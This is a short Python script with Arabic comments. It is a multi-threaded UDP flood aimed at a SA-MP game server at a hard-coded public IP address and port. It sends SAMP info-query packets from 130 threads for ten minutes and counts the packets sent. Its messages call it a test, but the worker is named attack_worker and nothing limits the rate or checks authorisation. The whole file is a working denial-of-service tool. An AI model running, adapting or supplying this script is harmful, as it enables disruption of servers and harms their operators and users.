import socket
import time
import threading

TARGET_IP = "170.62.202.93"  # استبدله بـ IP الهدف
TARGET_PORT = 7778        # استبدله بمنفذ السيرفر
DURATION = 600             # مدة الاختبار بالثواني
THREADS_COUNT = 130        # عدد الخيوط المتزامنة لزيادة الفاعلية

def attack_worker(end_time, stats):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # بناء الحزمة بشكل صحيح (SAMP Info Query)
    payload = b'SAMP' + socket.inet_aton(TARGET_IP) + int(TARGET_PORT).to_bytes(2, 'little') + b'i'
    
    local_count = 0
    try:
        while time.time() < end_time:
            client.sendto(payload, (TARGET_IP, TARGET_PORT))
            local_count += 1
    except Exception:
        pass
    finally:
        client.close()
        # تحديث العداء العام بشكل آمن
        with stats["lock"]:
            stats["total_sent"] += local_count

def test_connection():
    end_time = time.time() + DURATION
    stats = {"total_sent": 0, "lock": threading.Lock()}
    
    threads = []
    print(f"جاري بدء الاختبار على {TARGET_IP}:{TARGET_PORT} باستخدام {THREADS_COUNT} خيطاً...")
    
    for _ in range(THREADS_COUNT):
        t = threading.Thread(target=attack_worker, args=(end_time, stats))
        threads.append(t)
        t.start()
        
    for t in threads:
        t.join()
        
    print(f"انتهى الاختبار. الإجمالي الكلي للحزم المرسلة: {stats['total_sent']} حزمة.")

if __name__ == "__main__":
    test_connection()
